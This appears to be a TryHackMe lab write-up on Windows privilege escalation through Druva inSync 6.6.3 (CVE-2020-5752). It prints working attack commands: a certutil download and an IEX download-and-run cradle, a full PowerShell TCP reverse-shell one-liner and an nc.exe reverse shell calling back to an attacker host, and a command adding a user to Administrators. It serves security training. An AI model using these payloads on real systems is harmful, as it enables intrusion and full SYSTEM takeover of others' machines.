# LAB — Vulnerable Software

> **Lab**: [TryHackMe — Windows 10 PrivEsc](https://tryhackme.com/room/windows10privesc)
> **Concept**: Installed third-party software may have known privilege escalation vulnerabilities — enumerate versions and search for public exploits

---

## Theory

- Version-based exploits can exist in **any** installed software, not just the kernel
- Enumerate all installed software → search for public exploits matching the version → test them

> [!NOTE]
> `wmic product` may not list **all** installed software — it only shows programs installed via Windows Installer (MSI). For completeness, also check:
> - Desktop shortcuts
> - `C:\Program Files` and `C:\Program Files (x86)`
> - Control Panel → Programs and Features
> - `AppData` folders

## Exploitation — Druva inSync 6.6.3 (CVE-2020-5752)

The exploit script has a `$cmd` variable where you specify the command to execute with elevated privileges. The Druva inSync background service runs as **`NT AUTHORITY\SYSTEM`**, so the command executes as SYSTEM.

### Method 1 — Add Yourself to Administrators Group

Edit the exploit script on Kali:
```bash
gedit DruvaPE.ps1
```

Replace the `$cmd` value:
```powershell
$cmd = "net localgroup Administrators thm-unpriv /add"
```

Comment out the last line of the script (not needed).

![](attachments/Pasted%20image%2020260930181838.png)

Transfer and execute:
```bash
# Kali — serve the file
python3 -m http.server 8000
```

```cmd
:: Windows — download exploit
certutil -f -urlcache http://<KALI_IP>:8000/DruvaPE.ps1 DruvaPE.ps1
```

```powershell
# Windows — switch to PowerShell and import
powershell
Import-Module .\DruvaPE.ps1
```

![](attachments/Pasted%20image%2020260930182033.png)

Verify:
```cmd
net localgroup Administrators
```

**Result**: `thm-unpriv` is now in the Administrators group ✅

### Method 2 — Reverse Shell as SYSTEM

#### Create the Exploit Script

Edit `DruvaPE.ps1` — set `$cmd` to download and execute a PowerShell reverse shell:

```powershell
$cmd = 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<KALI_IP>:8000/mypowershell.ps1'')"'
```

> [!TIP]
> **Quoting rules**: Use single quotes for the outer string, double quotes for the inner command. Inside a single-quoted PowerShell string, a literal `'` is represented by `''`.
> ```
> ' outer string
>   powershell -c " inner command "
>                   '' URL quotes ''
> ' outer string
> ```

Comment out the last line of the script.

![](attachments/Pasted%20image%2020260930184902.png)

#### Create the Payload Script

Create `mypowershell.ps1` on Kali with a TCP reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<KALI_IP>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Source: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

#### Transfer & Execute

```bash
# Kali — serve both files
python3 -m http.server 8000
```


## Troubleshooting Notes

> [!WARNING]
> **Nishang `Invoke-PowerShellTCP`**: If using Nishang reverse shells, ensure the `Invoke-PowerShellTCP` function is **defined** in your payload script. The cmdlet is not built-in — it must be explicitly included.

> [!WARNING]
> **Base64 encoding issues**: When using Base64-encoded PowerShell payloads (e.g., from `revshells.com`), verify the full Base64 string is copied correctly. Missing leading/trailing characters will cause `system error 216` or encoding errors.

**Alternative payload approaches:**
- Use `msfvenom` to generate an `.exe` reverse shell and reference it in `$cmd`
- Use `nc.exe` directly: `$cmd = "C:\tools\nc64.exe -e cmd.exe <KALI_IP> 4444"`
- Add user to Administrators group: `$cmd = "net localgroup Administrators <username> /add"`

## Key Takeaways

- **Always enumerate** installed software with `wmic product get name,version,vendor`
- Supplement WMIC with manual checks (Program Files, desktop shortcuts, Control Panel)
- Search for each third-party software version on **Exploit-DB**, **Google**, and **GitHub**
- Prefer **PowerShell** (`.ps1`) scripts over Python exploits on Windows targets
- The Druva inSync service runs as **SYSTEM** — exploiting it gives direct SYSTEM access
- DLL hijacking in VNC follows the same methodology as Service Exploits DLL hijacking
